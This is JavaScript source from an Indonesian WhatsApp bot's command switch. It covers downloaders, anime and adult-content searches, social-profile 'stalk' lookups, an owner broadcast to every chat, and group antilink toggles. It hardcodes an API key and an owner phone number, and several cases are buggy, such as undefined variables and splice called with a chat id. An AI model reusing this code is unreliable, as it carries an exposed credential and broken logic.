//━━━━━━━━━━━━━━━[ FITUR OWNER ]━━━━━━━━━━━━━━━━━//
case 'addcmd': 
case 'setcmd':
if (isQuotedSticker) {
if (!q) return reply(`Penggunaan :  cmdnya dan tag stickernya`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, q)
replyy("Done Bwang")
} else {
replyy('tag stickenya')
}
break
// Del Cmd ( HW MODS WA )
case 'delcmd':
if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
replyy("Done Bwang")
break
case 'listcmd':
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of scommand) {
cemde.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd :* ${i.chats}`
}
replyy(teksnyee)
break
case 'restart':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
reply(`_Restarting ${botname}_`)
exec(`cd &&  node index`)
sleep(4000)
replyy('Sukses')
break		
case 'owner':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
members_ids = []
for (let mem of groupMembers) {
members_ids.push(mem.jid)
}
vcard2 = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n'
+ `FN:${ownername}\n`
+ `ORG: Creator ${ownername} ;\n`
+ `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n`
+ 'END:VCARD'.trim()
Hanz.sendMessage(from, {displayName: `Creator ${ownername}`, vcard: vcard2}, contact, 
{ quoted: ftrol, 
})
reply('TUHH NOMER OWNER KU')
break
case 'bc':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isOwner) return reply('LU BUKAN OWNER GBLOK')
if (args.length < 1) return reply('.......')
anu = await Hanz.chats.all()
if (isMedia && !mek.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
bc = await Hanz.downloadMediaMessage(encmedia)
for (let _ of anu) {
Hanz.sendMessage(_.jid, bc, image, { caption: `[ Izin Broadcast ]\n\n${body.slice(4)}` })
}
reply('Suksess broadcast')
} else {
for (let _ of anu) {
sendMess(_.jid, `[ *BOT BROADCAST* ]\n\n${body.slice(4)}`)
}
reply('Suksess broadcast')
}
break
case 'report':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
const pesan = body.slice(8)
if (pesan.length > 300) return pras.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, { quoted: ftrol })
var nomor = mek.participant
const teks1 = `*[REPORT]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${pesan}`
var options = {
text: teks1,
contextInfo: { mentionedJid: [nomor] },
}
Hanz.sendMessage(`6285157740529@s.whatsapp.net`, options, text, { quoted: ftrol })
reply('Masalah Telah Di Laporkan Ke Owner BOT, Mohon Tunggu Untuk Proses Perbaikan')
break
//━━━━━━━━━━━━━━━[ FITUR DOWNLOAD ]━━━━━━━━━━━━━━━━━//

case 'play':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return await reply(`Example: ${prefix + command} melukis senja`)
await fetchJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${lolkey}&query=${args.join(" ")}`)
.then(async(result) => {
await fetchJson(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${lolkey}&url=https://www.youtube.com/watch?v=${result.result[0].videoId}`)
.then(async(result) => {
result = result.result
caption = `❖ Title    : *${result.title}*\n`
caption += `❖ Size     : *${result.size}*`
ini_buffer = await getBuffer(result.thumbnail)
await Hanz.sendMessage(from, ini_buffer, image, { quoted: ftrol, caption: caption })
get_audio = await getBuffer(result.link)
await Hanz.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${result.title}.mp3`, quoted: ftrol })
})
})
break
case 'ytsearch':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Judul Video Yg Mau Di Cari Tod\nContoh : ${prefix + command} Melukis Senja`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Views : ${x.views}\n`
ini_txt += `Published : ${x.published}\n`
ini_txt += `Thumbnail : ${x.thumbnail}\n`
ini_txt += `Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
}
reply(ini_txt)
break
case 'ytmp4':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Link Nya Mana Tod\nContoh: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
ini_link = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${lolkey}&url=${ini_link}`)
get_result = get_result.result
ini_txt = `${get_result.title} - ${get_result.size}`
ini_buffer = await getBuffer(get_result.thumbnail)
await Hanz.sendMessage(from, ini_buffer, image, { quoted: ftrol, caption: ini_txt })
get_audio = await getBuffer(get_result.link)
await Hanz.sendMessage(from, get_audio, video, { mimetype: 'video/mp4', filename: `${get_result.title}.mp4`, quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7'})
break
case 'tiktok':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Link Nya Mana Tod\nContoh: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
ini_url = args[0]
ini_url = `https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${ini_url}`
get_result = await fetchJson(ini_url)
ini_buffer = await getBuffer(get_result.result.link)
await Hanz.sendMessage(from, ini_buffer, video, { quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7'})
break
case 'ttaudio': 
case 'tiktokmusic': 
case 'tiktokaudio':
reply(mess.wait)
if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
ini_link = args[0]
get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${Hanzkey}&url=${ini_link}`)
Hanz.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: mek })
break			
case 'detikvn':
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
mediam = await Hanz.downloadAndSaveMediaMessage(encmediam)
cokmatane = Number(args[0])
hah = fs.readFileSync(mediam)
Hanz.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
fs.unlinkSync(mediam)
break
case 'detikvideo':
encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
median = await Hanz.downloadAndSaveMediaMessage(encmedian)
cokmatane = Number(args[0])
hah = fs.readFileSync(median)
Hanz.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
fs.unlinkSync(median)
break           
case 'pinterest':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
query = args.join(" ")
ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${lolkey}&query=${query}`)
ini_url = ini_url.result
ini_buffer = await getBuffer(ini_url)
await Hanz.sendMessage(from, ini_buffer, image, { quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7'})
break
//━━━━━━━━━━━━━━━[ FITUR ANIME ]━━━━━━━━━━━━━━━━━//
case 'darkjokes':
if (isBanned) return reply(mess.only.benned)
reply(`Wait bwang...`)
anu = await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${lolkey}`, {method: 'get'})
tekss = `Wow Lucu Banget😱`
trans = `${footertext}`
but = [
          { buttonId: `${prefix}darkjokes`, buttonText: { displayText: '🔖 Next' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '💰 Donasi' }, type: 1 }
        ]
        sendButImage(from, tekss, trans, buff, but)
break
// ke 75
case 'ssweb':
if (args.length < 1) return reply(`Gini, ${prefix + command} https://github.com/KamiKaze2325/ScBot`)
wbny = body.slice(7)
reply(`✍️Tunggu....`)
anu = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=${lolkey}&url=${wbny}`)
weem = `✍️${botname}`
Hanz.sendMessage(from, anu, image, {quoted: mek, caption: weem})
break
case 'character':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/character?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = `Id : ${get_result.id}\n`
ini_txt += `Name : ${get_result.name.full}\n`
ini_txt += `Native : ${get_result.name.native}\n`
ini_txt += `Favorites : ${get_result.favourites}\n`
ini_txt += `Media : \n`
ini_media = get_result.media.nodes
for (var x of ini_media) {
ini_txt += `- ${x.title.romaji} (${x.title.native})\n`
}
ini_txt += `\nDescription : \n${get_result.description.replace(/__/g, "_")}`
thumbnail = await getBuffer(get_result.image.large)
await Hanz.sendMessage(from, thumbnail, image, { quoted: ftrol, caption: ini_txt })
break
case 'manga':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = `Id : ${get_result.id}\n`
ini_txt += `Id MAL : ${get_result.idMal}\n`
ini_txt += `Title : ${get_result.title.romaji}\n`
ini_txt += `English : ${get_result.title.english}\n`
ini_txt += `Native : ${get_result.title.native}\n`
ini_txt += `Format : ${get_result.format}\n`
ini_txt += `Chapters : ${get_result.chapters}\n`
ini_txt += `Volume : ${get_result.volumes}\n`
ini_txt += `Status : ${get_result.status}\n`
ini_txt += `Source : ${get_result.source}\n`
ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
ini_txt += `Score : ${get_result.averageScore}%\n`
ini_txt += `Characters : \n`
ini_character = get_result.characters.nodes
for (var x of ini_character) {
ini_txt += `- ${x.name.full} (${x.name.native})\n`
}
ini_txt += `\nDescription : ${get_result.description}`
thumbnail = await getBuffer(get_result.coverImage.large)
await Hanz.sendMessage(from, thumbnail, image, { quoted: ftrol, caption: ini_txt })
break
case 'anime':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = `Id : ${get_result.id}\n`
ini_txt += `Id MAL : ${get_result.idMal}\n`
ini_txt += `Title : ${get_result.title.romaji}\n`
ini_txt += `English : ${get_result.title.english}\n`
ini_txt += `Native : ${get_result.title.native}\n`
ini_txt += `Format : ${get_result.format}\n`
ini_txt += `Episodes : ${get_result.episodes}\n`
ini_txt += `Duration : ${get_result.duration} mins.\n`
ini_txt += `Status : ${get_result.status}\n`
ini_txt += `Season : ${get_result.season}\n`
ini_txt += `Season Year : ${get_result.seasonYear}\n`
ini_txt += `Source : ${get_result.source}\n`
ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
ini_txt += `Score : ${get_result.averageScore}%\n`
ini_txt += `Characters : \n`
ini_character = get_result.characters.nodes
for (var x of ini_character) {
ini_txt += `- ${x.name.full} (${x.name.native})\n`
}
ini_txt += `\nDescription : ${get_result.description}`
thumbnail = await getBuffer(get_result.coverImage.large)
await Hanz.sendMessage(from, thumbnail, image, { quoted: ftrol, caption: ini_txt })
break
case 'kusonimesearch':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = `Title : ${get_result.title}\n`
ini_txt += `Japanese : ${get_result.japanese}\n`
ini_txt += `Genre : ${get_result.genre}\n`
ini_txt += `Seasons : ${get_result.seasons}\n`
ini_txt += `Producers : ${get_result.producers}\n`
ini_txt += `Type : ${get_result.type}\n`
ini_txt += `Status : ${get_result.status}\n`
ini_txt += `Total Episode : ${get_result.total_episode}\n`
ini_txt += `Score : ${get_result.score}\n`
ini_txt += `Duration : ${get_result.duration}\n`
ini_txt += `Released On : ${get_result.released_on}\n`
ini_txt += `Desc : ${get_result.desc}\n`
link_dl = get_result.link_dl
for (var x in link_dl) {
ini_txt += `\n${x}\n`
for (var y in link_dl[x]) {
ini_txt += `${y} - ${link_dl[x][y]}\n`
}
}
ini_buffer = await getBuffer(get_result.thumbnail)
await Hanz.sendMessage(from, ini_buffer, image, { quoted: ftrol, caption: ini_txt })
break
case 'otakudesusearch':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = `Title : ${get_result.title}\n`
ini_txt += `Japanese : ${get_result.japanese}\n`
ini_txt += `Judul : ${get_result.judul}\n`
ini_txt += `Type : ${get_result.type}\n`
ini_txt += `Episode : ${get_result.episodes}\n`
ini_txt += `Aired : ${get_result.aired}\n`
ini_txt += `Producers : ${get_result.producers}\n`
ini_txt += `Genre : ${get_result.genres}\n`
ini_txt += `Duration : ${get_result.duration}\n`
ini_txt += `Studios : ${get_result.status}\n`
ini_txt += `Rating : ${get_result.rating}\n`
ini_txt += `Credit : ${get_result.credit}\n`
get_link = get_result.link_dl
for (var x in get_link) {
ini_txt += `\n\n*${get_link[x].title}*\n`
for (var y in get_link[x].link_dl) {
ini_info = get_link[x].link_dl[y]
ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
ini_txt += `\`\`\`Link : \`\`\`\n`
down_link = ini_info.link_dl
for (var z in down_link) {
ini_txt += `${z} - ${down_link[z]}\n`
}
}
}
reply(ini_txt)
break
case 'hentaisearch':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = "Result : \n"
for (var x of get_result) {
ini_txt += `Id : ${x.id}\n`
ini_txt += `Title English : ${x.title_english}\n`
ini_txt += `Title Japanese : ${x.title_japanese}\n`
ini_txt += `Native : ${x.title_native}\n`
ini_txt += `Upload : ${x.date_upload}\n`
ini_txt += `Page : ${x.page}\n`
ini_txt += `Favourite : ${x.favourite}\n\n`
}
reply(ini_txt)
break
case 'nekopoisearch':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Link : ${x.link}\n`
ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
}
reply(ini_txt)
break

//━━━━━━━━━━━━━━━[ FITUR SEARCH ]━━━━━━━━━━━━━━━━━//

case 'gimage':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Nama Yg Mau Dicari Mana Tod\nContoh: ${prefix + command} Sandrinna`)
query = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=${query}`)
await Hanz.sendMessage(from, ini_buffer, image, { quoted: ftrol })
break
case 'wallpapersearch':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Nama Yg Mau Dicari Mana Tod\nContoh: ${prefix + command} Sandrinna`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/wallpaper?apikey=${lolkey}&query=${query}`)
ini_buffer = await getBuffer(get_result.result)
await Hanz.sendMessage(from, ini_buffer, image, { quoted: ftrol })
break
case 'playstore':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Nama Aplikasinya Mana Tod\nContoh: ${prefix + command} tiktok`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/playstore?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = 'Play Store Search : \n'
for (var x of get_result) {
ini_txt += `Name : ${x.title}\n`
ini_txt += `ID : ${x.appId}\n`
ini_txt += `Developer : ${x.developer}\n`
ini_txt += `Link : ${x.url}\n`
ini_txt += `Price : ${x.priceText}\n`
ini_txt += `Price : ${x.price}\n\n`
}
reply(ini_txt)
break
case 'shopee':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Nama Barang Yg Mau Di Cari Mana Tod\nContoh: ${prefix + command} sepatu`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/shopee?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = 'Shopee Search : \n'
for (var x of get_result) {
ini_txt += `Name : ${x.name}\n`
ini_txt += `Terjual : ${x.sold}\n`
ini_txt += `Stock : ${x.stock}\n`
ini_txt += `Lokasi : ${x.shop_loc}\n`
ini_txt += `Link : ${x.link_produk}\n\n`
}
reply(ini_txt)
break
case 'google':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Nama Yg Mau Cari Mana Tod\nContoh: ${prefix + command} sandrinna`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/gsearch?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = 'Google Search : \n'
for (var x of get_result) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Link : ${x.link}\n`
ini_txt += `Desc : ${x.desc}\n\n`
}
reply(ini_txt)
break

//━━━━━━━━━━━━━━━[ FITUR PRIMBON ]━━━━━━━━━━━━━━━━━//

case 'artinama':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Namamya Mana Tod\nContoh: ${prefix + command} Zero YT7`)
ini_nama = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/artinama?apikey=${lolkey}&nama=${ini_nama}`)
reply(get_result.result)
break
case 'jodoh':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Namanya Mana Tod\nContoh: ${prefix + command} Zero & Sandrinna`)
ini_nama = args.join(" ").split("&")
nama1 = ini_nama[0].trim()
nama2 = ini_nama[1].trim()
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jodoh/${nama1}/${nama2}?apikey=${lolkey}`)
get_result = get_result.result
ini_txt = `Positif : ${get_result.positif}\n`
ini_txt += `Negative : ${get_result.negatif}\n`
ini_txt += `Deskripsi : ${get_result.deskripsi}`
reply(ini_txt)
break
case 'jadian':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Tanggal Jadiannya Mana Tod\nContoh: ${prefix + command} 12 12 2020`)
tanggal = args[0]
bulan = args[1]
tahun = args[2]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadian/${tanggal}/${bulan}/${tahun}?apikey=${lolkey}`)
get_result = get_result.result
ini_txt = `Karakteristik : ${get_result.karakteristik}\n`
ini_txt += `Deskripsi : ${get_result.deskripsi}`
reply(ini_txt)
break

//==============STALK MENU==============

case 'stalkig':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Usernamenya Mana Tod\nContoh: ${prefix + command} Sandrinna_11`)
username = args[0]
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${lolkey}`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.photo_profile)
ini_txt = `Username : ${ini_result.username}\n`
ini_txt += `Full Name : ${ini_result.fullname}\n`
ini_txt += `Posts : ${ini_result.posts}\n`
ini_txt += `Followers : ${ini_result.followers}\n`
ini_txt += `Following : ${ini_result.following}\n`
ini_txt += `Bio : ${ini_result.bio}`
Hanz.sendMessage(from, ini_buffer, image, { caption: ini_txt })
break
case 'stalktiktok':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Usernamenya Mana Tod\nContoh: ${prefix + command} Sandrinna`)
stalk_toktok = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/stalktiktok/${stalk_toktok}?apikey=ZeroYT7`)
get_result = get_result.result
ini_txt = `Username : ${get_result.username}\n`
ini_txt += `Nickname : ${get_result.nickname}\n`
ini_txt += `Bio : ${get_result.nickname}\n`
ini_txt += `Followers : ${get_result.followers}\n`
ini_txt += `Followings : ${get_result.followings}\n`
ini_txt += `Likes : ${get_result.likes}\n`
ini_txt += `Video : ${get_result.video}\n`
pp_tt = await getBuffer(get_result.user_picture)
Hanz.sendMessage(from, pp_tt, image, { quoted: ftrol, caption: ini_txt })
break
case 'stalkgithub':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Usernamenya Mana Tod\nContoh: ${prefix + command} Zero-YT7`)
username = args[0]
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${lolkey}`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.avatar)
ini_txt = `Name : ${ini_result.name}\n`
ini_txt += `Link : ${ini_result.url}\n`
ini_txt += `Public Repo : ${ini_result.public_repos}\n`
ini_txt += `Public Gists : ${ini_result.public_gists}\n`
ini_txt += `Followers : ${ini_result.followers}\n`
ini_txt += `Following : ${ini_result.following}\n`
ini_txt += `Bio : ${ini_result.bio}`
Hanz.sendMessage(from, ini_buffer, image, { caption: ini_txt })
break

//━━━━━━━━━━━━━━━[ FITUR RANDOM MEME ]━━━━━━━━━━━━━━━━━//

case 'randommeme':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
await getBuffer(`https://api.lolhuman.xyz/api/random/meme?apikey=${lolkey}`).then((gambar) => {
reply(mess.wait)
Hanz.sendMessage(from, gambar, image, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7'})
})
break
case 'randomdarkjoke':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${lolkey}`).then((gambar) => {
reply(mess.wait)
Hanz.sendMessage(from, gambar, image, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7'})
})
break
case 'randommemeindo':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
await getBuffer(`https://api.lolhuman.xyz/api/meme/memeindo?apikey=${lolkey}`).then((gambar) => {
reply(mess.wait)
Hanz.sendMessage(from, gambar, image, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7'})
})
break
//==============GROUP MENU=====================
case 'welcome':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (args.length < 1) return reply(`Ketik :\n${prefix}welcome on untuk mengaktifkan\n${prefix}welcome off untuk menonaktifkan`)
if ((args[0]) === 'on') {
if (isWelkom) return reply('welcome sudah aktif')
_welkom.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`✓Sukses mengaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
} else if ((args[0]) === 'off') {
if (!isWelkom) return reply('welcome sudah off sebelumnya')
_welkom.splice(from, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`✓Sukses menonaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
break
case 'antilink' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
but = [
{ buttonId: '!antilinkon', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '!antilinkoff', buttonText: { displayText: 'Off' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk antilink group", faketeks, but, mek)
break
case 'antilinkon' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
_antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`✓Sukses mengaktifkan fitur anti link di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antilinkoff' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (!isAntiLink) return reply('anti link sudah off sebelumnya')
_antilink.splice(from, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`✓Sukses menonaktifkan fitur anti link di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antivirtex' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
but = [
{ buttonId: '!antivirtexon', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '!antivirtexoff', buttonText: { displayText: 'Off' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk antivirtex group", faketeks, but, mek)
break
case 'listonline': 
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(Hanz.chats.get(ido).presences), Hanz.user.jid]
Hanz.sendMessage(from, 'LIST ONLINE:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n`, text, { quoted: fdoc,
contextInfo: { mentionedJid: online }
})			 
break
case 'antivirtexon' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (isAntiVirtex) return reply('anti virtex group sudah aktif sebelumnya')
_antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
reply(`\`\`\`Sukses mengaktifkan mode anti virtex di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antivirtexoff' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (!isAntiVirtex) return reply('Mode anti virtex sudah nonaktif sebelumnya')
_antivirtex.splice(from, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
